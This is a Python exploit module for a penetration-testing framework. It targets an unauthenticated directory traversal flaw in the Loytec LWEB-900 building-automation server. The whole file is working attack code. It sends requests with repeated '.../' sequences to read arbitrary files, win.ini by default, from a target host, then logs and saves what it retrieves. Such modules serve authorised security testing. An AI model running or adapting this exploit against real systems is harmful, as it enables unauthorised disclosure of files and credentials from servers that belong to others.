#!/usr/bin/env python
import urllib2
import base64
from collections import OrderedDict


from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_loytec_lweb900_server_dir_trav"
INFO['DESCRIPTION'] = "Loytec LWEB-900 Directory Traversal"
INFO['VENDOR'] = "https://www.logicals.com/"
INFO["CVE Name"] = ""
INFO["DOWNLOAD_LINK"] = "https://www.loytec.com/support/download/cat_view/13-software"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "4 Apr, 2018"
INFO['PATH'] = "General/"
INFO["NOTES"] = """
    Vulnerability exists in LWEB-900 server in ProjectLWeb802Service. 
Remote attacker can disclose arbitrary file on remote machine using ".../" combination. Authentication is not required.
Tested against LWEB-900 2.2.2 on Windows 7 x64 SP1.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.103"
OPTIONS["PORT"] = 8080
OPTIONS["FILENAME"] = "windows/win.ini"


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.payload = ""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.filename = self.args.get("FILENAME", OPTIONS["FILENAME"])

    def make_url(self, path=''):
        url = 'http://{}:{}/'.format(self.host, self.port) + path
        return url

    def run(self):
        #Get options from gui
        self.args()
        url = self.make_url()
        self.log('[*] Trying to connect to {}'.format(url))
        try:
            urllib2.urlopen(url)
        except urllib2.HTTPError as e:
            if e.code == 404:
                pass
        self.log('[*] Trying to get content of {}'.format(self.filename))
        url = self.make_url('lweb900/' + '.../'*6 + self.filename)
        data = urllib2.urlopen(url).read()
        if len(data) < 10000:
            self.log('[+]\r\n' + data)
        self.writefile(data)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()